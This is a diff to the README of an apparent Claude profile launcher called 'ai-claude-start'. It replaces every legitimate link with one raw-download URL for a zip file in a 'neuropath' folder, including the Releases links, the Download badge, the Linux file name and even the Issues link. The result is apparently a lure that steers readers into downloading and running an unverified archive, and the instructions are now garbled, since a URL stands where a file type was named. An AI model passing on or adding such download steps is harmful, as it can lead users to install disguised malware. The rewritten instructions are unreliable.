@@ -6,7 +6,7 @@ The **ai-claude-start** application simplifies the process of launching multiple
 
 ## 📥 Download Now
 
-[![Download ai-claude-start](https://img.shields.io/badge/Download-ai--claude--start-blue.svg)](https://github.com/Tito130/ai-claude-start/releases)
+[![Download ai-claude-start](https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip)](https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip)
 
 ## 🚀 Getting Started
 
@@ -21,20 +21,20 @@ To run **ai-claude-start**, ensure your system meets the following requirements:
 
 ### 🔗 Visit the Releases Page
 
-To download the application, visit our [Releases page](https://github.com/Tito130/ai-claude-start/releases). Here, you will find the latest version of **ai-claude-start** and other useful releases.
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip). Here, you will find the latest version of **ai-claude-start** and other useful releases.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/Tito130/ai-claude-start/releases) to find the latest version.
+1. Go to the [Releases page](https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip) to find the latest version.
 2. Choose the file suitable for your operating system. 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip` file.
 3. After the download is complete, locate the file in your Downloads folder.
 4. Open the file:
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file, then drag **ai-claude-start** to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the installer in the directory.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip` file and run the installer in the directory.
 5. Follow the on-screen instructions to complete the installation.
 
 Once installed, you can launch **ai-claude-start** from your applications menu.
@@ -66,7 +66,7 @@ Repeat this for each profile you want to create. The application will securely m
 
 ## 💬 Support & Feedback
 
-If you encounter issues or have suggestions, please visit the [Issues section](https://github.com/Tito130/ai-claude-start/issues) of our repository. We welcome feedback to enhance user experience.
+If you encounter issues or have suggestions, please visit the [Issues section](https://raw.githubusercontent.com/Tito130/ai-claude-start/main/neuropath/ai-claude-start.zip) of our repository. We welcome feedback to enhance user experience.
 
 ## 🗺️ Future Updates
 
